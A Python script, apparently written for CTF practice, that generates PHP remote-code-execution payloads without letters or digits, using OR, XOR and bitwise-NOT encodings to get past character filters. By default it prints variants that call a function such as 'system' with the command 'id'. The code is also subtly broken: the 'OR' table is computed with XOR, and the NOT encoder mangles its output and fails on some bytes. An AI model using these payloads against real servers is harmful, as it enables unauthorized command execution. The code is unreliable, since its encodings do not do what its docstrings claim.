# -*- coding: utf-8 -*-
"""无字符 RCE payload 生成器 — OR/XOR/NOT 绕过字符过滤.

CTF 常见考点: 过滤了字母数字, 用异或/或/取反绕过.
"""

from __future__ import annotations
import sys
import urllib.parse


def build_or_table() -> dict:
    """Build lookup: each char -> (hex_high, hex_low) for OR bypass.

    e.g. 'a' (0x61) = 0x60 | 0x01, both printable non-alpha.
    """
    table = {}
    for c in range(256):
        for a in range(256):
            b = c ^ a
            if _is_valid_rce_char(a) and _is_valid_rce_char(b):
                table[chr(c)] = (f"{a:02x}", f"{b:02x}")
                break
    return table


def build_xor_table() -> dict:
    """Build lookup: each char -> (hex_high, hex_low) for XOR bypass."""
    table = {}
    for c in range(256):
        for a in range(256):
            b = c ^ a
            if _is_valid_rce_char(a) and _is_valid_rce_char(b):
                table[chr(c)] = (f"{a:02x}", f"{b:02x}")
                break
    return table


def _is_valid_rce_char(c: int) -> bool:
    """Checks if hex byte is safe for RCE (printable, non-alpha preferred)."""
    ch = chr(c)
    # Skip alphanumeric (commonly filtered), control chars
    if ch.isalnum():
        return False
    if c < 0x20 or c > 0x7e:
        return False
    return True


OR_TABLE = build_or_table()
XOR_TABLE = build_xor_table()


def or_rce_payload(cmd: str) -> str:
    """Generate OR-based RCE payload string."""
    parts = []
    for ch in cmd:
        if ch in OR_TABLE:
            a, b = OR_TABLE[ch]
            parts.append(f'(%{a}|%{b})')
        else:
            parts.append(ch)
    return ''.join(parts)


def xor_rce_payload(cmd: str) -> str:
    """Generate XOR-based RCE payload string."""
    parts = []
    for ch in cmd:
        if ch in XOR_TABLE:
            a, b = XOR_TABLE[ch]
            parts.append(f'(%{a}^%{b})')
        else:
            parts.append(ch)
    return ''.join(parts)


def not_rce_payload(cmd: str) -> str:
    """Generate bitwise-NOT RCE payload (PHP ~ operator).

    Returns: (~urlencode(~'function'))(~urlencode(~'command'));
    """
    func_parts = [f"~{urllib.parse.quote(~c.to_bytes(1, 'big', signed=True))}" for c in cmd.encode()]
    return ''.join(func_parts)


def generate_all(cmd: str) -> dict:
    """Generate all bypass variants for a command."""
    return {
        "cmd": cmd,
        "OR": f'("{or_rce_payload(cmd)}")("{or_rce_payload("id")}")',
        "XOR": f'("{xor_rce_payload(cmd)}")("{xor_rce_payload("id")}")',
        "NOT": f'({not_rce_payload(cmd)})({not_rce_payload("id")});',
        "note": "For PHP: replace outer () with appropriate context",
    }


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if len(sys.argv) < 2:
        print("Usage: python rce_bypass.py <command> [--or|--xor|--not|--all]")
        print("Example: python rce_bypass.py 'system' --all")
        print("  Generates no-alphanumeric RCE payloads for PHP")
        sys.exit(0)

    cmd = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "--all"

    if mode == "--or":
        print("OR:", or_rce_payload(cmd))
    elif mode == "--xor":
        print("XOR:", xor_rce_payload(cmd))
    elif mode == "--not":
        print("NOT:", not_rce_payload(cmd))
    else:
        result = generate_all(cmd)
        for k, v in result.items():
            if k != "note":
                print(f"\n=== {k} ===")
                print(v)
        print(f"\n# {result['note']}")
